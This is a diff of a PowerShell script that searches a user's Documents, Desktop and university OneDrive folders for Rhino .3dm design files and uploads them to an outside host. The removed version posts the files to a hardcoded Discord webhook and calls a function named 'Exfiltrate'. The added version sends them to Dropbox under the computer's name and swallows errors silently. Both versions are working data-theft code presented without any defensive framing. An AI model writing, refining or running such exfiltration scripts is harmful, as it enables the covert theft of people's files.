@@ -1,62 +1,45 @@
-# Discord webhook
-$hookurl = "https://discord.com/api/webhooks/1340911792490287104/2HeVPsiXhBDRrGWh0eMr9w95fJXriWcCwmY4C87i0cItyUIwjGZ5EP9vg-Nukk3WvkHF"
-
-# Target locations
-$foldersToSearch = @(
+$accessToken = $db
+$localFolders = @(
     "$env:USERPROFILE\Documents",
     "$env:USERPROFILE\Desktop",
     "$env:USERPROFILE\OneDrive - University of Nebraska-Lincoln"
 )
 
-function Upload-ToDiscord {
-    param($FilePath)
-    try {
-        # Reduced chunk size to 8MB (Discord's limit is 25MB but we want buffer)
-        $chunkSize = 8MB
-        $fileBytes = [System.IO.File]::ReadAllBytes($FilePath)
-        
-        if ($fileBytes.Length -gt $chunkSize) {
-            Write-Host "[!] File too large, splitting into chunks..." -ForegroundColor Yellow
-            return
-        }
+$computerName = $env:COMPUTERNAME
+$dropboxFolderPath = "/$computerName"
+$dropboxUploadUrl = "https://content.dropboxapi.com/2/files/upload"
 
-        $boundary = [System.Guid]::NewGuid().ToString()
-        $fileName = Split-Path $FilePath -Leaf  # Only filename, no path
-        
-        $body = @(
-            "--$boundary",
-            "Content-Disposition: form-data; name=`"file1`"; filename=`"$fileName`"",
-            "Content-Type: application/octet-stream`r`n",
-            [System.Text.Encoding]::UTF8.GetString($fileBytes),
-            "--$boundary--"
-        ) -join "`r`n"
-
-        Invoke-RestMethod -Uri $hookurl -Method Post -Body $body -ContentType "multipart/form-data; boundary=$boundary"
-    }
-    catch {
-        Write-Host "[!] Upload failed: $_" -ForegroundColor Red
-    }
+# Create computer folder in Dropbox
+$headers = @{
+    "Authorization" = "Bearer $accessToken"
+    "Content-Type" = "application/json"
 }
+$body = @{
+    "path" = $dropboxFolderPath
+    "autorename" = $true
+} | ConvertTo-Json
+Invoke-RestMethod -Uri "https://api.dropboxapi.com/2/files/create_folder_v2" -Method Post -Headers $headers -Body $body | Out-Null
 
-function Process-Files {
-    Get-ChildItem -Path $foldersToSearch -Filter "*.3dm" -File -Recurse -ErrorAction SilentlyContinue | ForEach-Object {
+# Upload files
+$headers["Content-Type"] = "application/octet-stream"
+foreach ($folder in $localFolders) {
+    Get-ChildItem -Path $folder -Filter "*.3dm" -Recurse -File -ErrorAction SilentlyContinue | ForEach-Object {
         try {
-            # Upload each file individually (no zipping)
-            Write-Host "[+] Found: $($_.Name)" -ForegroundColor Cyan
-            Upload-ToDiscord -FilePath $_.FullName
+            $fileName = $_.Name
+            $dropboxPath = "$dropboxFolderPath/$fileName"
+            $fileBytes = [System.IO.File]::ReadAllBytes($_.FullName)
+            
+            $headers["Dropbox-API-Arg"] = @{
+                "path" = $dropboxPath
+                "mode" = "add"
+                "autorename" = $true
+                "mute" = $false
+            } | ConvertTo-Json -Compress
+            
+            Invoke-RestMethod -Uri $dropboxUploadUrl -Method Post -Headers $headers -Body $fileBytes
         }
         catch {
-            Write-Host "[!] Error processing $($_.Name): $_" -ForegroundColor Red
+            # Silent error handling
         }
     }
 }
-
-# Execution with visibility control
-[Console]::WindowWidth = 80
-[Console]::WindowHeight = 30
-Process-Files
-Write-Host "Operation complete" -ForegroundColor Green
-Start-Sleep -Seconds 5
-[Console]::WindowHeight = 30
-Exfiltrate
-Start-Sleep -Seconds 5
